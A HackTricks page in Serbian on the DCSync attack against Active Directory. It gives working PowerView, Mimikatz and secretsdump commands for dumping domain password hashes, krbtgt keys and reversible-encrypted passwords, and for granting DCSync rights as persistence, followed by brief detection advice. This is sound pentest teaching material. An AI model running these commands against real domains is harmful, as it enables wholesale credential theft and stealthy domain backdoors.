# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Dozvola **DCSync** podrazumeva da imate ove dozvole nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.

**Važne napomene o DCSync:**

- **DCSync napad simulira ponašanje Kontrolera domena i traži od drugih Kontrolera domena da repliciraju informacije** koristeći Directory Replication Service Remote Protocol (MS-DRSR). Pošto je MS-DRSR validna i neophodna funkcija Active Directory-a, ne može se isključiti ili onemogućiti.
- Po defaultu, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
- Ako su lozinke bilo kojih naloga sačuvane sa reverzibilnom enkripcijom, dostupna je opcija u Mimikatz-u da vrati lozinku u čistom tekstu.

### Enumeration

Proverite ko ima ove dozvole koristeći `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Eksploatiši lokalno
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Eksploatiši na daljinu
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` generiše 3 fajla:

- jedan sa **NTLM hešovima**
- jedan sa **Kerberos ključevima**
- jedan sa čistim lozinkama iz NTDS za bilo koje naloge sa [**reverzibilnom enkripcijom**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) omogućenim. Možete dobiti korisnike sa reverzibilnom enkripcijom pomoću

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Postojanost

Ako ste administrator domena, možete dodeliti ova prava bilo kojem korisniku uz pomoć `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Zatim, možete **proveriti da li je korisniku ispravno dodeljeno** 3 privilegije tražeći ih u izlazu (trebalo bi da možete da vidite imena privilegija unutar polja "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Ublažavanje

- Security Event ID 4662 (Audit Policy for object must be enabled) – Operacija je izvršena na objektu
- Security Event ID 5136 (Audit Policy for object must be enabled) – Objekt usluge direktorijuma je izmenjen
- Security Event ID 4670 (Audit Policy for object must be enabled) – Dozvole na objektu su promenjene
- AD ACL Scanner - Kreirajte i uporedite izveštaje o ACL-ima. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Reference

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
